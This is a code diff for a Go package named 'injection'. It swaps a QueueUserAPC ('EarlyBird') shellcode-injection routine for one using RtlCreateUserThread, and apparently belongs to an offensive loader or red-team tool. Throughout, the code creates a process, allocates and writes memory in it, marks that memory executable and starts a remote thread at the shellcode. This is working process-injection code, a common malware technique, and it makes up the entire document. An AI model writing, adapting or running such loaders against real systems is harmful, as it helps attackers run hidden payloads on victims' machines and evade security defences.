@@ -1,17 +1,13 @@
 package injection
 
 import (
-	"fmt"
 	"time"
 	"unsafe"
-
-	"golang.org/x/sys/windows"
 )
 
-func EarlyBird() {
-	fmt.Println("Starting QueueUserApc (EarlyBird)")
-
+func RtlCreateUserThreads() {
 	procInfo := createProcess()
+
 	addr, _, _ := VirtualAllocEx.Call(uintptr(procInfo.Process), 0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
 
 	// Workaround, cannot write to process memory before allocation finished, will have to fix for later.
@@ -21,10 +17,8 @@ func EarlyBird() {
 	oldProtect := PAGE_READWRITE
 	VirtualProtectEx.Call(uintptr(procInfo.Process), addr, uintptr(len(shellcode)), PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
 
-	QueueUserAPC.Call(addr, uintptr(procInfo.Thread), 0)
+	var tHandle uintptr
+	RtlCreateUserThread.Call(uintptr(procInfo.Process), 0, 0, 0, 0, 0, addr, 0, uintptr(unsafe.Pointer(&tHandle)), 0)
 
-	windows.ResumeThread(procInfo.Thread)
-	windows.CloseHandle(procInfo.Process)
-	windows.CloseHandle(procInfo.Thread)
-	fmt.Println("Finished QueueUserApc (EarlyBird)")
+	CloseHandle.Call(uintptr(uint32(procInfo.Process)))
 }
